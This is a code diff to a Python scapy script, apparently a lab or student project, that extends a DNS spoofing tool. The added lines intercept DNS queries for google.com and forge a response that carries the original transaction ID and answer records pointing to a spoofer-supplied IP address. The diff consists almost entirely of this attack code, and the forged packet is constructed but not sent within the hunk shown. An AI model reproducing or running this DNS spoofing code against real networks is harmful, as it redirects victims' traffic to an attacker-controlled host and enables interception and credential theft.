@@ -1,7 +1,7 @@
 from ipaddress import IPv4Network
 from scapy import all as scapy
 from scapy.layers.inet import IP, UDP
-from scapy.layers.dns import DNS, DNSQR
+from scapy.layers.dns import DNS, DNSQR, DNSRR
 from socket import *
 from fcntl import ioctl
 from struct import pack
@@ -37,8 +37,11 @@ def dnsSpoofing(targetIP, spoofIP,sourceIP):
     # del answer[scapy.UDP].chksum
     return answer
 
-def forwardDnsSpoofing():
+def forwardDnsSpoofing(spooferIP):
     def forwardDNS(orgPacket: IP):
+        if orgPacket[DNSQR].qname == b'google.com.':
+            print('DNS Spoofing')
+            spoofedPacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=orgPacket[UDP].dport) / DNS(id=orgPacket[DNS].id, qr=1, qd=orgPacket[DNS].qd, an=DNSRR(rrname=orgPacket[DNSQR].qname, ttl=10, rdata=spooferIP) / DNSRR(rrname=orgPacket[DNSQR].qname, ttl=10, rdata=spooferIP))
         packet = scapy.IP(dst='192.168.1.2') 
         packet= packet / scapy.UDP(sport=orgPacket[UDP].sport, dport=53)
         packet= packet / scapy.DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
